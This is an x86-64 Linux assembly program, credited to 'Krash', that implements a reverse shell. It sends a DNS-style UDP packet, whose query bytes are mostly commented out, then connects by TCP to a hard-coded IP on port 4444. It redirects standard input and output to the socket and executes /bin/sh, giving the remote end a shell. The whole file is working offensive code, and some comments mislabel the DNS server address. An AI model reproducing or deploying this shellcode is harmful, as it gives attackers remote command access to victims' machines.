;Author : Krash

; Notes:
; http://blog.rchapman.org/posts/Linux_System_Call_Table_for_x86_64/
;----------------- Assembly code -------------------

  
global main

section .data
   ; message db 'hello'
   ; sock    dw 2
    ;        db 10h , 00h 
    ;        db 7fh, 0h, 0h, 01h
    ;        db 0,0,0,0,0,0,0,0


section .text
       

main:

        mov rax, 41                                ;Create Socket
        mov rdi, 2                                 ;AF_INET
        mov rsi, 2                                 ;Sock_DGRAM
        mov rdx, 0                                 ;flags
        syscall                                    ;CALL SYSCALL CREATE SOCKET ; Looks good!

        mov rdi, rax                            ; sockfd
; ####################### DNS REQUEST

     ;    mov rax, 0x01000100006d6f63
     ;   push rax
     ;   mov rax, 0x0376656474696b74
     ;   push rax
     ;   mov rax, 0x6f6f720a00000000
     ;   push rax
     ;   mov rax, 0x000001000001AAAA
     ;   push rax
; ############################### 

        mov rsi ,rsp
        mov rdx, 32 ; len of bytes    ; Google IP  port 53  INET Family       
        mov rax, 0x0101010135000002   ; 8.8.8.8.8 - 0x35 - 00 00 02 
        push rax
        mov rax, 44                             ; Send Syscall
      
        mov r8, rsp
        mov r9, 16
        syscall


; Now need to read the response!

        xor rax, rax   ; read syscall == 0x00
        push 100        ; Set out bytes to response to be higher!
        pop rdx         ; rdx = input size
        sub rsp, rdx
        mov rsi, rsp    ; rsi => buffer
        syscall

        add rsp, rax ; This will give us the top of the stack where the answer is stored.
        sub rsp, 0x4 ;
        mov rax, [rsp]
        mov ebx, eax 
        mov rax, rbx




    ; Set up for TCP Session    

;         ;7F 00 00 01
        mov rax,  0xbf6d24b0
        ;mov rax, 0x0100007F                   ; UNCOMENT FOR TESTING! ; Push IP 127.0.0.1
        push rax                                ; Push our saved IP!
        push word 0x5c11                        ; Port (4444)
        push word 2                             ; Address family -


        push 42                                 ; connect syscall
        push byte 16                            ; length
        push byte 41                            ; socket syscall
        push byte 1                             ; type - SOCK_STREAM (0x1)
        push byte 2                             ; family - AF_INET (0x2)

        pop rdi                                 ; family
        pop rsi                                 ; type
        xor rdx, rdx                            ; protocol
        pop rax                                 ; socket syscall
        syscall

        mov rdi, rax                            ; sockfd
        pop rdx                                 ; length
        pop rax                                 ; connect syscall
        mov rsi, rsp                            ; sockaddr
        syscall

        xor rsi, rsi
loop:
        mov al, 33
        syscall
        inc rsi
        cmp rsi, 2
        jle loop

        xor rax, rax
        mov rdi, 0x68732f6e69622f2f
        xor rsi, rsi
        push rsi
        push rdi
        mov rdi, rsp
        xor rdx, rdx
        mov al, 59
        syscall